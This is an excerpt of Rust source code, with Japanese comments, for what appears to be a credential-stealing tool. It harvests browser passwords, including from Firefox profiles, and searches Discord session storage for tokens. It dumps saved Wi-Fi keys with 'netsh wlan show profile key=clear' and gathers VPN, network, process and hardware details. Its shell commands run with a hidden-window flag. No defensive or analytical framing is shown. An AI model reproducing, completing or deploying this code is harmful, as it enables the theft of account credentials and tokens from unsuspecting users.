...
pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
    ...
    auth_data
        .metadata
        .insert("collection_version".to_string(), "2.0".to_string());
    auth_data
        .metadata
    ...
    if config.collect_browser_passwords {
        ...
        // 後方互換性のため文字列形式も保持
        auth_data.passwords.extend(structured_creds.iter().map(|c| {
            format!(
                "{} - {}: {} / {}",
                c.browser, c.hostname, c.username, c.password
            )
        }));
    ...
    if config.collect_discord_tokens {
        match collect_discord_tokens() {
            ...
            Err(e) => auth_data
                .passwords
                .push(format!("Discord token error: {}", e)),
        }
    }
    ...
    // メタデータ更新
    auth_data.metadata.insert(
        "total_passwords".to_string(),
        auth_data.passwords.len().to_string(),
    );
    auth_data.metadata.insert(
        "total_wifi_profiles".to_string(),
        auth_data.structured_wifi.len().to_string(),
    );
    auth_data.metadata.insert(
        "total_network_interfaces".to_string(),
        auth_data.structured_network.len().to_string(),
    );
    auth_data.metadata.insert(
        "total_processes".to_string(),
        auth_data.process_list.len().to_string(),
    );
    auth_data.metadata.insert(
        "total_storage_drives".to_string(),
        auth_data.storage_info.len().to_string(),
    );
...
fn collect_cpu_info() -> CpuInfo {
    ...
    #[cfg(windows)]
    {
        ...
        if let Ok(cpu_data) = collect_windows_cpu_info() {
            cpu_info.name = cpu_data
                .get("name")
                .unwrap_or(&"Unknown CPU".to_string())
                .clone();
            cpu_info.cores = cpu_data
                .get("cores")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);
            cpu_info.logical_cores = cpu_data
                .get("logical_cores")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);
            cpu_info.frequency_mhz = cpu_data
                .get("frequency_mhz")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0);
            cpu_info.usage_percent = cpu_data
                .get("usage_percent")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0.0);
        }
...
fn collect_memory_info() -> MemoryInfo {
    ...
    #[cfg(windows)]
    {
        if let Ok(memory_data) = collect_windows_memory_info() {
            mem_info.total_gb = memory_data
                .get("total_gb")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0.0);
            mem_info.available_gb = memory_data
                .get("available_gb")
                .and_then(|s| s.parse().ok())
                .unwrap_or(0.0);
...
fn execute_custom_command(command: &str) -> Result<String, CollectError> {
    ...
    #[cfg(windows)]
    {
        ...
        if output.status.success() {
            ...
            Err(CollectError::CommandFailed(format!(
                "Command '{}' failed",
                command
            )))
        }
            ...
            if line.contains(':') {
                ...
                if parts.len() == 2 {
                    ...
                    match key.as_str() {
                        ...
                        "system_boot_time" | "システム起動時刻" => {
                            system_info.insert("boot_time".to_string(), value)
                        }
            ...
            if line.contains('=') && !line.trim().is_empty() {
                ...
                if parts.len() == 2 {
                    ...
                    if !value.is_empty() {
                        match key.as_str() {
                            "name" => {
                                cpu_info.insert("name".to_string(), value);
                            }
                            "numberofcores" => {
                                cpu_info.insert("cores".to_string(), value);
                            }
                            "numberoflogicalprocessors" => {
                                cpu_info.insert("logical_cores".to_string(), value);
                            }
                            "maxclockspeed" => {
                                cpu_info.insert("frequency_mhz".to_string(), value);
                            }
                            _ => {}
                        }
                    }
...
fn collect_windows_memory_info() -> Result<BTreeMap<String, String>, CollectError> {
    ...
    let total_output = Command::new("cmd")
        .args([
            "/C",
            "chcp 65001 >nul 2>&1 && wmic computersystem get TotalPhysicalMemory /value",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| CollectError::Io(e))?;
                        ...
                        match key.as_str() {
                            ...
                            "size" => {
                                if let Ok(bytes) = value.parse::<u64>() {
                                    current_storage.total_gb =
                                        bytes as f64 / (1024.0 * 1024.0 * 1024.0);
                                }
                            }
                            "freespace" => {
                                if let Ok(bytes) = value.parse::<u64>() {
                                    current_storage.free_gb =
                                        bytes as f64 / (1024.0 * 1024.0 * 1024.0);
                                    current_storage.used_gb =
                                        current_storage.total_gb - current_storage.free_gb;
                                    if current_storage.total_gb > 0.0 {
                                        current_storage.usage_percent = (current_storage.used_gb
                                            / current_storage.total_gb
                                            * 100.0)
                                            as f32;
                                    }
...
fn collect_windows_logged_users() -> Result<Vec<String>, CollectError> {
    ...
    if output.status.success() {
        ...
        for line in user_text.lines().skip(1) {
            // ヘッダーをスキップ
...
fn parse_ipconfig_network_details(text: &str) -> Vec<NetworkDetail> {
    ...
    for line in text.lines() {
        ...
        if line.ends_with(':')
            && contains_any(
                line,
                ["adapter", "アダプター", "Ethernet", "Wi-Fi", "ワイヤレス"],
            )
        {
        ...
        if let Some(ref mut interface) = current_interface {
            ...
            // MAC アドレス
            if contains_any(line_trimmed, ["Physical Address", "物理アドレス"])
            ...
            // IPv4 アドレス
            if contains_any(line_trimmed, ["IPv4 Address", "IPv4 アドレス"])
                && line_trimmed.contains(':')
            {
                if let Some(ip) = line_trimmed.split(':').nth(1) {
                    interface.local_ip = trim_all(ip)
            ...
            // 接続状態
            if contains_any(line_trimmed, ["Media State", "メディアの状態"])
                && line_trimmed.contains(':')
            {
...
fn collect_firefox_structured_passwords() -> Result<Vec<BrowserCredential>, CollectError> {
    ...
    let profiles = get_firefox_profiles()
        .map_err(|e| CollectError::Parse(format!("Firefox profiles: {}", e)))?;
...
fn collect_structured_wifi_profiles() -> Result<(Vec<String>, Vec<WifiProfile>), CollectError> {
    ...
    if !output.status.success() {
        return Err(CollectError::CommandFailed(
            "netsh wlan show profiles failed".to_string(),
        ));
    }
...
fn get_wifi_profile_detail(profile_name: &str) -> Result<WifiProfileDetail, CollectError> {
    ...
    let detail_output = Command::new("cmd")
        .args([
            "/C",
            &format!(
                "chcp 65001 >nul 2>&1 && netsh wlan show profile name=\"{}\" key=clear",
                profile_name
            ),
        ])
        .creation_flags(0x08000000)
            ...
            if contains_any(line, ["Key Content", "キー コンテンツ"]) && line.contains(':') {
                if let Some(key) = line.split(':').nth(1) {
                    ...
                    if !key_value.is_empty()
                        && key_value != "Not Present"
                        && !key_value.contains("存在しません")
                    {
...
fn parse_wifi_profile_names(text: &str) -> Vec<String> {
    ...
    for line in text.lines() {
        if contains_any(line, ["All User Profile", "すべてのユーザー プロファイル"])
            && line.contains(':')
        {
...
fn parse_ipconfig_interfaces(text: &str) -> Vec<AuthNetworkInterface> {
    ...
    for line in text.lines() {
        ...
        if let Some(ref mut interface) = current_interface {
            ...
            // IPv6 アドレス
            if contains_any(line_trimmed, ["IPv6 Address", "IPv6 アドレス"])
                && line_trimmed.contains(':')
            {
                if let Some(ip) = line_trimmed.split(':').nth(1) {
                    let ip_clean = trim_all(ip)
            ...
            // デフォルトゲートウェイ
            if contains_any(line_trimmed, ["Default Gateway", "既定のゲートウェイ"])
                && line_trimmed.contains(':')
            {
            ...
            // DNS サーバー
            if starts_with_any(line_trimmed, ["DNS Servers", "DNS サーバー"])
                && line_trimmed.contains(':')
            {
...
fn collect_discord_tokens() -> AoiResult<Vec<String>> {
    ...
    {
        Ok(vec![
            "Discord token extraction only supported on Windows".to_string()
        ])
    }
}
...
fn collect_vpn_connections() -> Vec<String> {
    ...
    // RAS接続情報
    if let Ok(output) = Command::new("rasdial").creation_flags(0x08000000).output() {
...
fn collect_network_adapters() -> Vec<String> {
    ...
    if let Ok(output) = Command::new("wmic")
        .args([
            ...
            "get",
            "name,adaptertype,macaddress,netconnectionstatus",
            "/format:list",
        ])
        .creation_flags(0x08000000)
        .output()
...
fn collect_unix_network_info() -> Vec<String> {
    ...
    if let Ok(output) = Command::new("nmcli").args(["connection", "show"]).output() {
...
fn extract_discord_with_patterns() -> AoiResult<Vec<String>> {
    ...
    // 追加のディレクトリもチェック
    tokens.extend(
        search_tokens_in_directory(&discord_path.join("Session Storage")).unwrap_or_default(),
    );
